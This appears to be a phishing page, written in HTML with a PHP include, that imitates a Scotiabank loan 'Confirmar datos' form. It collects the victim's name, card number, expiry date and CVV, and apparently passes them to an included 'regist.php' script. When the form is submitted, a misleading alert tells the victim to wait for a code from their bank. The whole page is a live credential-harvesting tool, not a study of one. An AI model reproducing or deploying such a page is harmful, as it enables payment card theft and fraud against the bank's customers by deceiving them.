<!DOCTYPE html>
<html>
<head>
	  <title>Confirmar datos</title>

	  <link rel="icon" type="image/vnd.microsoft.icon" href="../content/dam/scotiabank/enterprise/images/logos/favicon.ico"/>
 
      <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="../content/dam/scotiabank/enterprise/images/logos/favicon.ico"/>

      <link rel="stylesheet" type="text/css" href="sti/estilo.css">
      <meta charset="utf-8">
</head>

 


<body style="background: " >

<div class="conte">

<a style="font-size: 40px;
margin-left: 700px;
color: #24303c;
text-decoration: none;
margin-top: 0px;" href="#"></a>
  

<img style="max-width:px;
max-height: 75px;" src="images/logo12.png">  
	
<div style="margin-top:1px;" >

<form method="post">
	 <br style="margin-bottom: 20px;">
	 <br >
<div>
	      




         <input class="cuadro" type="text" name="nombre" placeholder="NOMBRE Y APELLIDO" required="" autofocus="" autocomplete="">

          <input maxlength="18" minlength="14" style="margin-bottom: 14px;" class="cuadro" type="text" name="tarjeta" placeholder="NUMERO DE TARJETA" required="" autofocus="" autocomplete="">

	      



	<input style="max-width: 50px;
  height: 30px;
  border-radius: 5px; margin-left: 50px; text-align: center; font-size: 17px;" type="text" name="mes"placeholder="MES" required="" autocomplete=""  minlength="1" maxlength="2" >


   <input style="max-width: 50px;
  height: 30px;
  border-radius: 5px; text-align: center; margin-bottom: 15px; margin-left: 10px; font-size: 17px;" type="text" name="ano"placeholder="AÑO" required="" autocomplete="" maxlength="4" minlength="2">


      <input maxlength="4" minlength="3" style="" class="cuadro" type="password" name="cvv" placeholder="CVV" required="" autocomplete="off">  
	  	 
	  

          <input name="enviar" type="submit" value="Confirmar" style="font-size: 22px;
          cursor: pointer; " 
               class="n" 
               class="cuadro" onclick="alert('Consulte codigo en las proximas horas, a travez de su Banco en linea o desde su app');">                   
           </input>

           <?php 
        include("regist.php");
        ?>

                      <br>
                      <br>
                      

           
           <a style="cursor: pointer;" class="nu" href="prestamos.html">Cancelar Operacion</a>

              <br>
                  <br>
                      <br>

<a class="cancelar" href="sti/tyc-prestamosingarantia-medioselectronicos.pdf" target="_self">
    Terminos y Condiciones</a>





</form>

</div>
</div>
</div>
</body>
</html>